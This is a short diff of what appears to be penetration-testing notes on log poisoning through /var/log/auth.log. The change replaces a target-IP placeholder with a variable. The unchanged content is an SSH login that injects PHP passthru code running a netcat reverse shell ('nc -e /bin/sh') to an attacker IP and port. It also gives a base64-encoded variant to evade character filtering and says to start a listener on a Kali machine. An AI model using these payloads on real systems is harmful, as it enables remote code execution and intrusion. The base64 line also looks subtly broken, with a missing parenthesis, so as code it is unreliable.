@@ -46,14 +46,14 @@ For instance, with /var/log/auth.log, we can try an ssh connection and see how t
 
 
 ```
-ssh "<?passthru('nc -e /bin/sh <attacker IP> <attacker port>');?>"@<TARGETIP> 
+ssh "<?passthru('nc -e /bin/sh <attacker IP> <attacker port>');?>"@$ip 
 ```
 
 But there might be problems with blank spaces, slashes and so on, so one thing you can do is base64 encoded your netcat command, and tell the function to decode it before executing it  
 
 ```
 # base64 encode your netcat command: nc -e /bin/sh <attacker IP> <attacker port>
-ssh "<?passthru(base64_decode'<base64 encoded text>');?>"@<TARGETIP> 
+ssh "<?passthru(base64_decode'<base64 encoded text>');?>"@$ip 
 ```
 
 Now just get a netcat listener in your kali attacker machine.
